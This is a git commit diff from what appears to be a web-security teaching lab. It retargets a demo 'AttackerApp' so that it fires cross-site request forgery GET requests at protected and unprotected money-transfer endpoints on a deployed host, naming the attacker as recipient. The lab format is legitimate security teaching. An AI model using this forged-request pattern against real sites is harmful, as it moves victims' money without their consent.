4e99528c8901d6f4185d96ad66341f99975d0a18
Sven Leko <svenleko2@gmail.com>
2023-11-12 19:16:59 +0100

    Finished

--- AttackerApp/Pages/Index.razor.cs
+++ AttackerApp/Pages/Index.razor.cs
@@ -12,14 +12,14 @@ namespace AttackerApp.Pages
         private async void Attack()
         {
             // if the user is logged in to the other application, this will send money from the user to the attacker
-            await HttpClient.GetAsync($"https://localhost:7259/transaction?recipient={AttackerName}");
+            await HttpClient.GetAsync($"https://web2lab2.azurewebsites.net/transaction?recipient={AttackerName}");
             _successMessage = "Money not sent to attacker! You can check the code on github to see how this works!";
         }
         
         private async void AttackUnprotected()
         {
             // the unsafe version of the endpoint does not check properly the state of the user and will send money to the attacker
-            await HttpClient.GetAsync($"https://localhost:7259/transaction-unsafe?recipient={AttackerName}");
+            await HttpClient.GetAsync($"https://web2lab2.azurewebsites.net/transaction-unsafe?recipient={AttackerName}");
             _successMessage = "Money sent to attacker if the user is logged in to the other app! You can check the code on github to see how this works!";
             StateHasChanged();
         }
